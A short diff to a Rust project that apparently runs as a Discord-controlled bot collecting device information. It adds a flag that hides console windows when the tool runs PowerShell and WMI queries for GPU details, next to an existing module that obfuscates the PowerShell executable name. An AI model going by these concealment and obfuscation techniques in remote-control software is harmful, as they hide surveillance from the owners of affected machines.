@@ -3,6 +3,7 @@ use crate::commands::*;
 use crate::system_info::DeviceInfo;
 use anyhow::Result;
 use async_trait::async_trait;
+use std::os::windows::process::CommandExt;
 use std::process::Command;
 use sysinfo::{CpuExt, DiskExt, System, SystemExt};
 use twilight_http::Client as HttpClient;
@@ -243,6 +244,7 @@ impl InfoCommand {
                     "Name,AdapterRAM",
                     "/format:list",
                 ])
+                .creation_flags(0x08000000)
                 .output()
             {
                 if output.status.success() {
@@ -310,6 +312,7 @@ impl InfoCommand {
                 use crate::utils::obfuscate::{exe, powershell as ps};
                 Command::new(exe::powershell())
                     .args([&ps::command(), "Get-WmiObject -Class Win32_VideoController | Select-Object Name, AdapterRAM | Format-List"])
+                    .creation_flags(0x08000000)
                     .output()
             } {
                 if output.status.success() {
